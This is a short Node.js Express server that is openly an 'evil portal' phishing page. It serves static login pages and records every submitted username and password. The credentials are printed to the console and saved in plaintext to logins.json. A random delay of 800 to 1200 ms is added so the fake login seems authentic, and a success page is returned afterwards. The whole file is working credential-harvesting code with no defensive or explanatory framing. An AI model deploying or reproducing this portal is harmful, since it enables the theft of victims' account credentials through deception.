import fsp from 'node:fs/promises'
import express from 'express'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

const DB_FILE = './logins.json'
await fsp.writeFile(DB_FILE, '[]')

let data = JSON.parse(await fsp.readFile(DB_FILE))

const app = express()

// static files (HTML, CSS)
app.use(express.static('public'))
app.use(express.urlencoded({ extended: true }))

// handle login
app.post('/login', async (req, res) => {
    const { username, password } = req.body
    console.log(username, password)
    data = [...data, { username, password }]
    await fsp.writeFile(DB_FILE, JSON.stringify(data))
    // generate random delay between 800 and 1200 ms
    const delay = Math.floor(Math.random() * 401) + 800
    await new Promise((res) => setTimeout(res, delay)) // simulate delay
    res.sendFile(
        path.join(
            path.dirname(fileURLToPath(import.meta.url)),
            'public',
            'success.html'
        )
    )
})

app.listen(8080, () => console.log('evil portal on port 8080'))
